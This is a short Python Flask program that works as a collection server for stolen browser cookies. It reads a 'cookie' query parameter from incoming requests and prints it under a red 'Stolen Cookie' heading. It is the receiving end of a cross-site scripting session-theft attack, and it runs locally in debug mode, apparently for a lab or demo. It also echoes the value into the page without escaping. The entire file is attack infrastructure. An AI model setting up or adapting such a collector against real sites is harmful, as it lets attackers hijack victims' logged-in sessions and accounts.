from flask import Flask, request


app = Flask(__name__)


@app.route('/', methods=['POST', 'GET'])
def index():
    stolen_cookie = ''
    stolen_cookie = request.args.get('cookie')
    return '<br><h1 style="color:red;text-align:center;">Stolen Cookie</h1><br><br><br>'+ '<h4 style="color:blue;text-align:center"/>'+ str(stolen_cookie) 


if __name__ == '__main__':
    app.run(debug=True, host='localhost', port=5002)

   

